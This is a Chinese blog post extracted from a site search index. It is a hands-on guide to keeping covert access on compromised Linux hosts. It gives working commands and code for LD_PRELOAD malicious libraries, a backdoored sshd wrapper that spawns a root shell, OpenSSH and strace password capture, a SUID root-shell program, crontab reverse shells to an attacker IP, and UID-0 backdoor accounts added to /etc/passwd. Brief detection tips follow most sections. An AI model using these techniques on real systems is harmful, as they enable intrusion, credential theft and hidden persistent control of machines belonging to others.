<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linux单机权限维持</title>
    <url>/posts/45846/</url>
    <content><![CDATA[<h1 id="Linux单机权限维持"><a href="#Linux单机权限维持" class="headerlink" title="Linux单机权限维持"></a>Linux单机权限维持</h1><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>目前看来所有的进程注入都是指的以附加<code>.so</code>文件的形式注入。</p>
<p>原理:<a href="https://0x00sec.org/t/linux-infecting-running-processes/1097">Linux Infecting Running Processes</a><br>译文:<a href="https://kevien.github.io/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/">linux进程注入</a></p>
<p>工具推荐:<br>1.<a href="https://github.com/gaffe23/linux-inject/">linux-inject</a><br>使用ptrace向进程中注入恶意so文件<br>使用示例:<a href="https://payloads.online/archivers/2020-01-01/2">Linux权限维持之进程注入</a><br>2.<a href="https://github.com/DavidBuchanan314/dlinject">dlinject</a><br>不使用ptrace向进程中注入恶意so文件</p>
<h3 id="排查方式"><a href="#排查方式" class="headerlink" title="排查方式"></a>排查方式</h3><p>1.基于时间线索筛出so文件<br>2.遍历进程，获取so观察时间</p>
<a id="more"></a>
<h2 id="Linux预加载型恶意动态链接库"><a href="#Linux预加载型恶意动态链接库" class="headerlink" title="Linux预加载型恶意动态链接库"></a>Linux预加载型恶意动态链接库</h2><h3 id="预备知识点"><a href="#预备知识点" class="headerlink" title="预备知识点"></a>预备知识点</h3><p>1.linux动态链接库预加载机制：<br>在linux操作系统的动态链接库加载过程中，动态链接器会读取<code>LD_PRELOAD</code>环境变量的值和默认配置文件<code>/etc/ld.so.preload</code>的文件内容，并将读取到的动态链接库进行预加载。即使程序不依赖这些动态链接库，<code>LD_PRELOAD</code>环境变量和<code>/etc/ld.so.preload</code>配置文件中指定的动态链接库依然会被装载，它们的优先级比<code>LD_LIBRARY_PATH</code>环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</p>
<p>2.全局符号介入<br>全局符号介入指的是应用程序调用库函数时，调用的库函数如果在多个动态链接库中都存在(存在同名函数)，那么链接器只会保留第一个链接的函数，而忽略后面链接进来的函数。所以只要预加载的全局符号中有和后加载的普通共享库中全局符号重名，那么就会覆盖后装载的共享库以及目标文件里的全局符号。</p>
<h3 id="利用LD-PRELOAD环境变量"><a href="#利用LD-PRELOAD环境变量" class="headerlink" title="利用LD_PRELOAD环境变量"></a>利用LD_PRELOAD环境变量</h3><p>LD_PRELOAD环境变量是会及时生效的，加载恶意动态链接库方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LD_PRELOAD&#x3D;&#x2F;lib&#x2F;evil.so # LD_PRELOAD的值设置为要预加载的动态链接库</span><br><span class="line">export LD_PRELOAD # 导出环境变量使该环境变量生效</span><br></pre></td></tr></table></figure>
<p>（导出后应该就会被隐藏，没试也不知道为什么</p>
<h4 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $LD_PRELOAD # 查看是否加载了库以及是否恶意</span><br><span class="line">unset LD_PRELOAD # 解除设置的LD_PRELOAD环境变量</span><br></pre></td></tr></table></figure>

<h3 id="利用ld-so-preload配置文件"><a href="#利用ld-so-preload配置文件" class="headerlink" title="利用ld.so.preload配置文件"></a>利用ld.so.preload配置文件</h3><p>将恶意动态链接库路径写入<code>/etc/ld.so.preload</code>(没有则创建)配置文件中即生效，对应的恶意动态链接库文件被隐藏。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#x2F;lib&#x2F;evil.so&quot; &gt; &#x2F;etc&#x2F;ld.so.preload</span><br></pre></td></tr></table></figure>

<h4 id="排查-1"><a href="#排查-1" class="headerlink" title="排查"></a>排查</h4><p>因为恶意动态链接库一般都有隐藏<code>/etc/ld.so.preload</code>文件的功能，使用普通的<code>ls</code>、<code>cat</code>等命令无法读取对应配置文件的内容，此时我们可以使用静态编译的<code>ls</code>命令、<code>cat</code>命令（推荐使用busybox自带命令)来绕过预加载的恶意动态链接库。</p>
<p>清除顺序:<br>(a)<code>/etc/ld.so.preload</code>文件中查看到的<code>/lib/evil.so</code>文件<br>(b)<code>/etc/ld.so.preload</code>文件中的内容</p>
<p>排查案例参考:<br><a href="https://www.jianshu.com/p/31e487daa79d">记一次CPU占用过半，进程被隐藏的木马</a><br><a href="https://www.fooying.com/linux-hide-process-miner-analysis/">Linux 遭入侵，挖矿进程被隐藏案例分析</a></p>
<h3 id="修改动态链接器"><a href="#修改动态链接器" class="headerlink" title="修改动态链接器"></a>修改动态链接器</h3><p>通过修改动态链接器中配置文件路径<code>/etc/ld.so.preload</code>为自定义的路径来实现更加隐蔽的恶意动态链接库预加载。<br>rootkit示例:<a href="https://github.com/mempodippy/vlany">Vlany</a></p>
<h4 id="排查-2"><a href="#排查-2" class="headerlink" title="排查"></a>排查</h4><p>使用文件完整性检查来检查该动态链接器是否被修改。</p>
<h2 id="基于SSH衍生后门"><a href="#基于SSH衍生后门" class="headerlink" title="基于SSH衍生后门"></a>基于SSH衍生后门</h2><p>用的似乎不多，因为公网开ssh的不多。</p>
<h3 id="openssh源码包替换后门文件"><a href="#openssh源码包替换后门文件" class="headerlink" title="openssh源码包替换后门文件"></a>openssh源码包替换后门文件</h3><h4 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h4><p>实践参考:<br>1.<a href="https://blog.csdn.net/Aixixxx/article/details/104399536">OpenSSH万能后门</a><br>2.<a href="https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/">OpenSSH源码下载地址</a></p>
<p>实践的过程发现编译出错，看了一下代码发现是博主原文写错:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auth-passwd.c:88:57: 错误：‘Authctxt’没有名为‘server_user’的成员</span><br><span class="line">   fprintf(f,&quot;user:password@host --&gt; %s:%s@%s\n&quot;,authctxt-&gt;server_user,password,authctxt-&gt;host);</span><br><span class="line">auth-passwd.c:88:88: 错误：‘Authctxt’没有名为‘host’的成员</span><br><span class="line">   fprintf(f,&quot;user:password@host --&gt; %s:%s@%s\n&quot;,authctxt-&gt;server_user,password,authctxt-&gt;host);</span><br></pre></td></tr></table></figure>
<p>改成如下即可:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fprintf(f,&quot;username: %s password: %s&quot;, authctxt-&gt;user, password);</span><br></pre></td></tr></table></figure>

<p>Centos SSH日志位置:<code>/var/log/secure</code></p>
<h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><p>别问…问就是搞了两小时环境都没搞对….</p>
<h3 id="ssh-wrapper正向后门"><a href="#ssh-wrapper正向后门" class="headerlink" title="ssh wrapper正向后门"></a>ssh wrapper正向后门</h3><p>可以理解为另写了一个带ssh功能的程序代替了<code>/usr/sbin/sshd</code></p>
<p>受害主机上执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cd &#x2F;usr&#x2F;sbin</span><br><span class="line">[root@localhost sbin]# mv sshd ..&#x2F;bin</span><br><span class="line">[root@localhost sbin]# echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">[root@localhost sbin]# echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">[root@localhost sbin]# echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">[root@localhost sbin]# chmod +x sshd</span><br><span class="line">[root@localhost sbin]# service sshd restart</span><br></pre></td></tr></table></figure>
<p>后门代码解释：<br>第一行，如果当前文件句柄STDIN是一个socket，且socket的远程连接源端口是31334（Big网络字节序中的16进制字符串为<code>\x00\x00zf</code>， 正好匹配上perl正则<code>..zf</code>，上述代码中的<code>zf</code>是Big网络字节序的Ascii表示形式），则执行<code>/bin/sh</code>，并结束当前程序运行（不会执行第二步），相当于反弹一个root shell（因为sshd是以root权限运行的）给远程socket（一般只有攻击者指定连接的源端口才能触发这一行的执行）<br>第二行，启动sshd(/usr/bin/sshd是真正的sshd)服务，凡是传递给<code>/usr/sbin/sshd</code>(后门)的参数都传递给真正的sshd（这一行保证了普通用户也可以正常使用ssh服务，登录并不会有什么异常现象）</p>
<p>攻击主机上执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:10.18.180.20:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure>
<p>源端口修改计算：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">19526</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span><br><span class="line"><span class="string">&#x27;\x00\x00LF&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">13377</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure>

<p>还有一个Python版:<a href="https://zhuanlan.zhihu.com/p/75864959">使用python编写了openssh后门</a>，没有试。</p>
<h4 id="CentOS7实践的坑"><a href="#CentOS7实践的坑" class="headerlink" title="CentOS7实践的坑"></a>CentOS7实践的坑</h4><p>把<code>/usr/sbin/sshd</code>篡改后，正常用户无法ssh连上去。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># mieea @ mieea-mbp in ~ [9:08:38]</span><br><span class="line">$ ssh u111@10.211.55.12 -p 22</span><br><span class="line">u111@10.211.55.12&#39;s password:</span><br><span class="line">Last login: Fri Oct 30 09:05:02 2020</span><br><span class="line">&#x2F;bin&#x2F;bash: Permission denied</span><br><span class="line">Connection to 10.211.55.12 closed.</span><br></pre></td></tr></table></figure>
<p>搜索后发现是由于SeLinux检测到sshd文件已更改，因此如果不禁用SeLinux，它将阻止通过ssh连接服务器。<br>于是我把<code>/etc/selinux/config</code>的SELinux属性设置为disabled，再<code>reboot</code>重启，ssh就能正常使用了。</p>
<p>因为遇到这个问题，我在Ubuntu18.04下也试了一次，并没有影响正常用户ssh连接。nice :)</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1].<a href="http://drops.xmd5.com/static/drops/tips-1951.html">渗透技巧之SSH篇</a><br>[2].<a href="https://www.fr1sh.com/?post=8">【转载】一款短小精致的SSH后门分析</a><br>[3].<a href="https://www.einfosec.com.cn/2019/11/27/hide-openssh-version/">Hide OpenSSH version</a>–解决CentOS实践的坑<br>[4].<a href="https://www.linuxidc.com/Linux/2019-11/161565.htm">如何在CentOS 8上禁用SELinux</a><br>[5].<a href="https://www.freebuf.com/articles/system/243862.html">Linux基础软件威胁疑云：从已知到“未知”</a><br>[6].<a href="https://www.welivesecurity.com/wp-content/uploads/2018/12/ESET-The_Dark_Side_of_the_ForSSHe.pdf">ESET-The_Dark_Side_of_the_ForSSHe.pdf</a></p>
<h3 id="排查方式-1"><a href="#排查方式-1" class="headerlink" title="排查方式"></a>排查方式</h3><p>查MD5看是否被篡改。<br>CentOS：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -Vf &#x2F;usr&#x2F;bin&#x2F;ssh</span><br><span class="line">rpm -Va</span><br></pre></td></tr></table></figure>
<p>Ubuntu:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo debsums --changed</span><br></pre></td></tr></table></figure>

<h2 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h2><p>pam后门通常是指pam源码包修改重编译替换。<br>推荐阅读:<a href="https://xz.aliyun.com/t/7902">Linux Pam后门总结拓展</a><br>总体和前面OpenSSH源码植入代码重新打包的感觉很像，而且更加繁琐。校验方式也是和SSH校验一样的，官方校验。</p>
<h2 id="VIM后门"><a href="#VIM后门" class="headerlink" title="VIM后门"></a>VIM后门</h2><p>命令：<br><code>$(nohup vim -E -c &quot;pyfile door.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f door.py</code><br>试了试感觉异常的不好用，所以也不写了。</p>
<h3 id="排查方式-2"><a href="#排查方式-2" class="headerlink" title="排查方式"></a>排查方式</h3><p>检测对应vim进程号虚拟目录的map文件是否有python字符。(是否不够靠谱?)</p>
<h2 id="strace记录后门"><a href="#strace记录后门" class="headerlink" title="strace记录后门"></a>strace记录后门</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<p>使用了一下感觉还行？主要是简单，但log文件有点太大了。</p>
<p>按理说su命令也可以做类似操作，但实际不行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alias su&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.su.log -e read,write,connect -s 2048 su&#39;</span><br></pre></td></tr></table></figure>
<p>分析参见: <a href="https://xz.aliyun.com/t/2917">利用su小偷实现低权限用户窃取root用户口令</a></p>
<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<p>这里是改的<code>/etc/bashrc</code>，改动后所有新打开的bash都会生效。<br><code>/etc</code>路径下的配置文件将会应用到整个系统，属于系统级的配置，而修改用户目录下的<code>.bashrc</code>则只是限制在用户应用上，属于用户级设置。</p>
<h3 id="排查-3"><a href="#排查-3" class="headerlink" title="排查"></a>排查</h3><p>使用<code>alias</code>命令即可发现，或者去排查<code>/etc/bashrc</code>等shell配置文件。</p>
<h2 id="基于suid衍生后门"><a href="#基于suid衍生后门" class="headerlink" title="基于suid衍生后门"></a>基于suid衍生后门</h2><p>setuid: 设置使文件在执行阶段具有文件所有者的权限. 典型的文件是 /usr/bin/passwd. 如果一般用户执行该文件， 则在执行过程中， 该文件可以获得root权限， 从而可以更改用户的密码.</p>
<h3 id="基础后门示例"><a href="#基础后门示例" class="headerlink" title="基础后门示例"></a>基础后门示例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, argv[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译加权：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc backdoor.c -o backdoor</span><br><span class="line">chmod u+s &#x2F;bin&#x2F;backdoor</span><br></pre></td></tr></table></figure>

<h2 id="常规crontab反弹shell"><a href="#常规crontab反弹shell" class="headerlink" title="常规crontab反弹shell"></a>常规crontab反弹shell</h2><p>CentOS定时任务参数说明: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[u111@CentOS7 cron.d]$ cat &#x2F;etc&#x2F;crontab</span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">PATH&#x3D;&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line">MAILTO&#x3D;root</span><br><span class="line"></span><br><span class="line"># For details see man 4 crontabs</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name  command to be executed</span><br></pre></td></tr></table></figure>

<p>Ubuntu定时任务参数说明:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u111@host1:&#x2F;var&#x2F;spool&#x2F;cron$ cat &#x2F;etc&#x2F;crontab</span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># m h dom mon dow user	command</span><br><span class="line">17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">#</span><br></pre></td></tr></table></figure>

<p>基本是没什么区别，但ubuntu有一个坑点需要注意，就是<code>/bin/sh</code>指向<code>dash</code>从而会导致反弹失败。<br>参考阅读: <a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">解决ubuntu crontab反弹shell失败的问题</a></p>
<p>辅助工具: <a href="https://tool.lu/crontab/">crontab执行时间计算</a></p>
<h3 id="反弹示例1"><a href="#反弹示例1" class="headerlink" title="反弹示例1"></a>反弹示例1</h3><p>实验环境CentOS7<br>存放反弹文件<code>doorr.sh</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.211.55.15/12323  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>输入命令<code>crontab -e</code>进行编辑，加入内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;3 * * * * bash &#x2F;home&#x2F;u111&#x2F;doorr.sh</span><br></pre></td></tr></table></figure>
<p><code>doorr.sh</code>设置了<code>u+x</code>，但普通用户和root用户的<code>crontab -e</code>依旧影响权限，普通反弹普通用户shell，root的才能反弹root。可能有办法在普通用户的crontab反弹root权限shell，暂时没查。</p>
<h3 id="反弹示例2"><a href="#反弹示例2" class="headerlink" title="反弹示例2"></a>反弹示例2</h3><p>实验环境CentOS7<br>root用户输入命令<code>crontab -e</code>进行编辑，加入内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.211.55.15&#x2F;12323  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>会在<code>/var/spool/cron</code>目录下生成<code>root</code>文件，注意文件权限为600。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@CentOS7 cron]# pwd</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">[root@CentOS7 cron]# ll</span><br><span class="line">总用量 4</span><br><span class="line">-rw-------. 1 root root 58 11月  6 14:42 root</span><br></pre></td></tr></table></figure>
<p>如果是普通用户u111输入命令<code>crontab -e</code>进行创建，则会生成<code>/var/spool/cron/u111</code>文件。</p>
<h3 id="Ubuntu反弹注意事项"><a href="#Ubuntu反弹注意事项" class="headerlink" title="Ubuntu反弹注意事项"></a>Ubuntu反弹注意事项</h3><p>实验环境Ubuntu18.04<br>解决方式1: 将<code>/bin/sh</code>指向从<code>dash</code>改到<code>bash</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s -f bash &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<p>解决方式2: 避免在cron文件里去使用bash这个shell，另外去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用这个shell脚本文件。<br>脚本文件<code>/root/doorr.sh</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.211.55.15&#x2F;12323  0&gt;&amp;1　</span><br></pre></td></tr></table></figure>
<p><code>crontab -e</code>进行编辑，加入内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;1 * * * * &#x2F;root&#x2F;doorr.sh</span><br></pre></td></tr></table></figure>

<h3 id="排查-4"><a href="#排查-4" class="headerlink" title="排查"></a>排查</h3><p>一般通过<code>crontab -l</code>命令即可检测到定时任务后门。<code>crontab -r</code>进行删除。</p>
<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p>[1].<a href="https://zhuanlan.zhihu.com/p/115082330">CentOS7定时任务crontab入门</a></p>
<h2 id="开机启动init-d"><a href="#开机启动init-d" class="headerlink" title="开机启动init.d"></a>开机启动init.d</h2><h3 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h3><p>将后门代码藏到<code>/etc/rc.d/init.d/functions</code>中。<br><img src="/images/Linux%E7%BB%B4%E6%9D%83%E5%90%8E%E9%97%A8_functions.png" alt="Linux维权后门_functions"></p>
<h3 id="排查-5"><a href="#排查-5" class="headerlink" title="排查"></a>排查</h3><p>不同的linux发行版可能查看开机启动项的文件不大相同。<br>Debian系linux系统一般是通过查看<code>/etc/init.d</code>目录有无最近修改和异常的开机启动项。<br>而Redhat系的linux系统一般是查看<code>/etc/rc.d/init.d</code>或者<code>/etc/systemd/system</code>等目录。</p>
<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3><p>learn from: <a href="https://ixyzero.com/blog/archives/2717.html">BROOTKIT代码学习和原理分析</a><br>关于BROOTKIT如何实现文件、进程、端口的隐藏和盗取root用户密码：<br><code>install.sh</code>安装程序中有一行代码：<code>cp brootkit.sh /etc/profile.d/emacs.sh</code>，这一行代码的作用在于——以后每次打开一个登录shell的时候都会加载这个脚本（而脚本中的内容是一些和builtin命令重名的自定义function），从而实现Bash函数重载，过滤掉相关输出内容，这样就可以达到自定义隐藏文件、进程、端口+盗取root用户密码的目的。<br>但是简单的函数重载会被Bash内建的builtin/declare/typeset/type/set/command等命令识别出来，所以，除了给ls/ps/netstat等命令重新实现function之外，还需要做进一步的处理，即将这些builtin命令也进行重载。这样就可以实现自定义隐藏文件、进程、端口+盗取root用户密码的功能。</p>
<p>在Bash中命令的执行遵循下面的顺序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 自定义alias: alias su&#x3D;&quot;ls -l&quot;</span><br><span class="line">2. 自定义function: function su &#123; echo &quot;Hello world&quot;; &#125;</span><br><span class="line">3. Bash内置命令builtin</span><br><span class="line">4. 外部程序(在环境变量PATH中进行查找)</span><br></pre></td></tr></table></figure>

<h2 id="简单但容易被发现系列"><a href="#简单但容易被发现系列" class="headerlink" title="简单但容易被发现系列"></a>简单但容易被发现系列</h2><h3 id="添加root权限后门用户"><a href="#添加root权限后门用户" class="headerlink" title="添加root权限后门用户"></a>添加root权限后门用户</h3><h4 id="Way1"><a href="#Way1" class="headerlink" title="Way1"></a>Way1</h4><p>用脚本生成密码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ perl -e &#39;print crypt(&quot;233233&quot;,&quot;\$6\$lfeC2bwp\$&quot;) . &quot;\n&quot;&#39;</span><br><span class="line">$6$lfeC2bwp$CHZDNi3FN4Wx7CfZ4hmsQ2EobrMxnLT4ox9bPgkloSzGOXEaY8ovBOYIxMfuWU.4GTcg7rq65Mq0flISqZHE01</span><br></pre></td></tr></table></figure>

<p>在<code>/etc/passwd</code>中追加用户:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor:$6$lfeC2bwp$CHZDNi3FN4Wx7CfZ4hmsQ2EobrMxnLT4ox9bPgkloSzGOXEaY8ovBOYIxMfuWU.4GTcg7rq65Mq0flISqZHE01:1000:1000::&#x2F;home&#x2F;u111:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>原本我想添加root组，但是因为这边限制了root无法远程ssh，所以改到了u111。但是接下来又出现了问题:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ sudo cat &#x2F;etc&#x2F;passwd</span><br><span class="line">[sudo] u111 的密码：</span><br><span class="line">u111 不在 sudoers 文件中。此事将被报告。</span><br></pre></td></tr></table></figure>
<p>但我<code>su</code>能直接切到root权限，然后就正常了，不太明白但暂时就这样把:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># mieea @ mieea-mbp in ~ [15:10:53]</span><br><span class="line">$ ssh backdoor@10.211.55.12</span><br><span class="line">backdoor@10.211.55.12&#39;s password:</span><br><span class="line">Last login: Mon Nov  2 15:09:14 2020 from 10.211.55.2</span><br><span class="line">[u111@CentOS7 ~]$ whoami</span><br><span class="line">u111</span><br><span class="line">[u111@CentOS7 ~]$ su</span><br><span class="line">密码：</span><br><span class="line">[root@CentOS7 u111]# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>————20201209update</p>
<p>犯了一个缺乏运维基础知识的错…su和sudo当然不一样<br>sudo用不了是因为没在<code>/etc/sudoers</code>文件中配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root	ALL&#x3D;(ALL) 	ALL</span><br><span class="line">u111	ALL&#x3D;(ALL) 	ALL</span><br></pre></td></tr></table></figure>

<h4 id="Way2"><a href="#Way2" class="headerlink" title="Way2"></a>Way2</h4><p>用脚本生成密码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[u111@CentOS7 ~]$ perl -e &#39;print crypt(&quot;678233&quot;,&quot;\$6\$lfeC2bwp\$&quot;) . &quot;\n&quot;&#39;</span><br><span class="line">$6$lfeC2bwp$Edp4I6FXzv17d&#x2F;V2&#x2F;f2KbkFQ6b3paA21f722955psSd4t2GbWe4yzy29ftRRuW91Bbog7u42cg4tU52NIMxRm&#x2F;</span><br></pre></td></tr></table></figure>

<p>在<code>/etc/passwd</code>中追加用户:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor2:$6$lfeC2bwp$Edp4I6FXzv17d&#x2F;V2&#x2F;f2KbkFQ6b3paA21f722955psSd4t2GbWe4yzy29ftRRuW91Bbog7u42cg4tU52NIMxRm&#x2F;:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>一般都会限制root的远程ssh登陆，因此:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
<p>将<code>PermitRootLogin</code>的值改成yes。<br>再重启sshd:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>

<p>登陆成功:</p>
